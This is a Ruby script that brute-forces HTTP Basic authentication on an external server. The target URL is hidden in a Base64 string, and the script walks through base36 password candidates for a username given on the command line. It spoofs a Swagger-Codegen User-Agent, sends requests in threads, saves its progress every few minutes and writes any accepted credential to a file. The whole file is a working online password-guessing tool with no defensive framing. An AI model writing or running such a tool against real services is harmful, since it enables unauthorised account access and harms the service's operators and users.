require 'base64';
require 'net/http';
require 'uri';
require 'json';
require 'time';

=begin
curl http://ifconfig.me
compare ip addresses
🎲 1f3b2
#rand(36**10).to_s(36) alphanum, length 10
(0..(36**3)).each {|x|print x.to_s(36)+','}
0,,z,10,,1z,20,,zz,100,,zzz,1000
=end

#ip addr obfuscation
ENCODED='aHR0cHM6Ly9sYXVuY2hlcjMwMS5jb21jYXZlLmRlOjgxODI=';#301
EXTERN_URL = Base64.decode64(ENCODED);

REGEX6 = /\A\D\d\D\d\D{6}\z/;#todo: group \A(letter_digit){2}

#sends request to server
#auth must me base64 urlsafe encoded
#returns nil or answer
def send_request(auth)
  resp = nil;
  url = URI("#{EXTERN_URL}/ping/list");
  connection = Net::HTTP.new(url.host, url.port);
  connection.use_ssl = true;

  request = Net::HTTP::Get.new(url);
  request["Authorization"]	= "Basic #{auth}"
  request["Content-Type"] 	= "application/json";
  request["User-Agent"] 	  = "Swagger-Codegen/1.2.0-SNAPSHOT/java";
  begin
    resp = connection.request(request);
  rescue StandardError => e
    #print "#{e.class} occured at: #{Time.now}";
  ensure
    return resp;
  end
end#send_request

#todo rescue ensure file closes
def found(auth)
  file = File.new(auth,'w+');
  file.puts(Base64.decode64(auth));
  file.close();
end#found

def save_last(tried_creds,counter)#needs base36 string, size:10
  file = File.new(tried_creds,'w+');
  file.puts(tried_creds+" #{counter} #{Time.now}\u{0a}");
  file.close();
end#save_last

counter = 0;
flag = false;#thread will set flag every 6 min.
set_flag_thread = Thread.new do
  loop do
    sleep(60*5);#every 5 minutes
    flag = true;
    puts "\u{1f6a9} #{counter} #{Time.now} flag set\n"#🚩
  end#loop
end#logger_thread

user_name       = ARGV[0];#llllddd:
#base36 string
last_inspected  = ARGV[1];#cmd line arg or nil
#@user_creds = (ARGV != nil)? ARGV[0] : login_creds;
possible_pass_int = (last_inspected)? last_inspected.to_i(36) : 'zzzzzzzzz'.to_i(36);

success = false;

until success do
  possible_pass_36 = possible_pass_int.to_s(36);
  auth = Base64.urlsafe_encode64(user_name+possible_pass_36);
  #unless REGEX6.match?(possible_pass_36)
  #  possible_pass_int +=1;
  #  next;
  #end


  t = Thread.new do
    #Thread.current[:resp] = send_request(auth);
    resp = send_request(auth);
    counter +=1;
    #binding.irb;
    if (resp.code == '200')
      success = true;
      found(auth);
      sleep(2);
    end
    #puts "\u{1f33a} #{user_name}#{possible_pass_36}\n"#🌺
    #puts "\u{1f333} #{resp.to_hash}\n#{resp.code}\n"#🌳

  end#thread
  t.join(3);

  if flag
    save_last(possible_pass_36,counter);
    flag = false;
    counter = 0;
  end#if

  possible_pass_int +=1;#integer expected

end#until loop
